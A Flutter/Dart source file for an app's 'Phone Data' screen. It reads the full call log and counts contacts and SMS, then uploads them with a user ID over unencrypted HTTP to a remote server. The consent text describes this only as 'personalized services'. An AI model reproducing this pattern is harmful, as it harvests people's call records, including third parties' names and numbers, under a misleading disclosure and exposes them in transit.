import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:call_log/call_log.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';

class PhoneData extends StatefulWidget {
  final String data;

  const PhoneData({Key? key, required this.data}) : super(key: key);

  @override
  State<PhoneData> createState() => _PhoneDataState();
}

class _PhoneDataState extends State<PhoneData> {
  bool tf = true;
  @override
  void initState() {
    super.initState();
    getSmsPerm();
  }

  final SmsQuery _query = SmsQuery();

  void getSmsPerm() async {
    var permission = await Permission.sms.status;
    if (permission.isGranted) {
      final messages =
          await _query.querySms(kinds: [SmsQueryKind.inbox, SmsQueryKind.sent]);
    } else {
      await Permission.sms.request();
    }
  }

  void getPhoneStats() async {
    setState(() {
      tf = false;
    });
    // --------------------------Making callLog Data------------------------------------------
    List<Object> dataCollected = [];
    final Iterable<CallLogEntry> result = await CallLog.query();

    for (CallLogEntry entry in result) {
      dataCollected.add({
        "name": entry.name,
        "number": entry.number,
        "call_type": entry.callType.toString(),
        "date": DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)
            .toIso8601String(),
        "duration": entry.duration,
        "sim": entry.simDisplayName
      });
    }
// --------------------------Making MobileFP Data------------------------------------------
    int no_sms = 0;
    int no_contacts = 0;

    if (!await FlutterContacts.requestPermission(readonly: true)) {
      print("denied");
    } else {
      final contacts = await FlutterContacts.getContacts();
      no_contacts = contacts.length;
    }

    var permission = await Permission.sms.status;
    if (permission.isGranted) {
      final messages =
          await _query.querySms(kinds: [SmsQueryKind.inbox, SmsQueryKind.sent]);
      no_sms = messages.length;
    } else {
      await Permission.sms.request();
    }

// --------------------------Sending Call Log------------------------------------------
    var bodys = json.encode({
      'userId': widget.data,
      'call_log': {"list": dataCollected}
    });

    var url = Uri.parse('http://shababe.pythonanywhere.com/addDeepSocialData/');

    var resp = await http.post(url,
        headers: {"Content-Type": "application/json"}, body: bodys);

    print(resp.statusCode);
// --------------------------Sending MobileFp------------------------------------------

    bodys = json.encode(
        {'userId': widget.data, 'no_contacts': no_contacts, "no_sms": no_sms});

    url = Uri.parse('http://shababe.pythonanywhere.com/addMobileFpData/');

    resp = await http.post(url,
        headers: {"Content-Type": "application/json"}, body: bodys);

    print(resp.statusCode);

    Navigator.of(context).pushNamed(
      '/imageQues',
      arguments: widget.data,
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Padding(
      padding: const EdgeInsets.fromLTRB(25, 40, 25, 30),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: [
          Center(
              child: Image.asset(
            'assets/images/phone.png',
            height: 300,
            width: 300,
          )),
          const Center(
            child: Text(
              'Phone Data',
              style: TextStyle(
                  fontWeight: FontWeight.bold,
                  fontSize: 25,
                  color: Color.fromARGB(255, 55, 63, 98)),
              textAlign: TextAlign.center,
            ),
          ),
          const Center(
            child: Text(
                'Dear user, in order to enhance your experience and provide you with personalized services, we would like to request your permission to access your phone data. This information will help us understand your preferences and improve the overall functionality of our app. Please be assured that your data will be securely stored and protected in accordance with our privacy policy. We value your trust and thank you for taking the time to consider this request.',
                style: TextStyle(
                  color: Color.fromARGB(255, 87, 85, 86),
                  decorationThickness: 2.85,
                ),
                textAlign: TextAlign.justify),
          ),
          Padding(
            padding: const EdgeInsets.fromLTRB(0, 10, 0, 0),
            child: Center(
              child: tf
                  ? FilledButton(
                      onPressed: getPhoneStats,
                      style: FilledButton.styleFrom(
                          backgroundColor: Color.fromARGB(188, 37, 51, 94)),
                      child: const Text('Give permissions'))
                  : const Center(
                      child: CircularProgressIndicator(),
                    ),
            ),
          )
        ],
      ),
    ));
  }
}
